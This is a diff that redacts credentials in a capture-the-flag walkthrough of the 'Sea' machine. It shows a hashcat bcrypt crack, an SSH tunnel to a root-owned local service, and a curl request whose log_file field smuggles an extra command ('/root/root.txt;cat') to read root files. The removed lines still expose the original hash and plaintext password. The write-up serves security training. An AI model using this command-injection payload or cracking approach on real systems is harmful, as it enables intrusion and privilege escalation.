@@ -14,14 +14,14 @@ Foothold
 Lateral Movement / Credentials
 ├── /var/www/sea/data/database.js
 │   └── bcrypt hash: $2y$10$iOrk210RQSAzNCx6Vyq2X...
-├── hashcat -m 3200 → mychemicalromance
+├── hashcat -m 3200 → <PASSWORD>
 └── su - amay → user.txt (<USER_FLAG>)
 
 Privilege Escalation
 ├── netstat → 127.0.0.1:8080 (monitoring.service от root)
 ├── SSH-туннель: ssh amay@sea.htb -L 8081:127.0.0.1:8080
 ├── curl -X POST http://localhost:8081/ \
-│     -u amay:mychemicalromance \
+│     -u amay:<PASSWORD> \
 │     -d "log_file=/root/root.txt;cat&analyze_log="
 └── root flag (<ROOT_FLAG>)
 
@@ -366,7 +366,7 @@ SO WE SEE THE PASSWORD HASH
 
 lets save hash to file for hashcat (without \)
 
-echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
+echo '<BCRYPT_HASH>' > hash.txt
 
 
 our hash has $2y$ prefix, so it is bcrypt. for bcrypt we will use the mode:  -m 3200
@@ -378,7 +378,7 @@ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
 after this, we have a password:
 
-$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+<BCRYPT_HASH>:<PASSWORD>
 
 go to find a users:
 
@@ -487,7 +487,7 @@ intercept POST request with Burp
 
 
 
-curl -X POST http://localhost:8080/ -u amay:mychemicalromance -d "log_file=/root/root.txt;cat&analyze_log="
+curl -X POST http://localhost:8080/ -u amay:<PASSWORD> -d "log_file=/root/root.txt;cat&analyze_log="
 
 
 
